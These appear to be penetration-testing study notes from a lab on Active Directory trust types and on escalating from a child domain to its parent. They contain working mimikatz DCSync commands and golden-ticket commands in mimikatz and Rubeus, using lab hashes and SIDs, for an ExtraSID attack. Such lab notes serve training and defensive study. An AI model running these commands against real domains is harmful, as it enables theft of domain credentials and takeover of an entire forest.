### Domain Trust Types
* Parent-child: Two or more domains within the same forest. The child domain has a two-way transitive trust with the parent domain, meaning that users in the child domain corp.inlanefreight.local could authenticate into the parent domain inlanefreight.local, and vice-versa.
* Cross-link: A trust between child domains to speed up authentication.
* External: A non-transitive trust between two separate domains in separate forests which are not already joined by a forest trust. This type of trust utilizes SID filtering or filters out authentication requests (by SID) not from the trusted domain.
* Tree-root: A two-way transitive trust between a forest root domain and a new tree root domain. They are created by design when you set up a new tree root domain within a forest.
* Forest: A transitive trust between two forest root domains.
* ESAE: A bastion forest used to manage Active Directory.
### Enumerating Trust Relationships
```
Import-Module activedirectory
Get-ADTrust -Filter *
```
### Child Domain 
IntraForest = True
### ExtraSID Attack
Requires
* The KRBTGT hash for the child domain (mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt)
* The SID for the child domain (Powerview,Get-DomainSID)
* The name of a target user in the child domain (does not need to exist!)
* The FQDN of the child domain.
* The SID of the Enterprise Admins group of the root domain.(Powerview, Get-ADGroup -Identity "Enterprise Admins" -Server "INLANEFREIGHT.LOCAL")
```
mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
```
or 
```
.\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt
```
If Success:
```
mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm
```
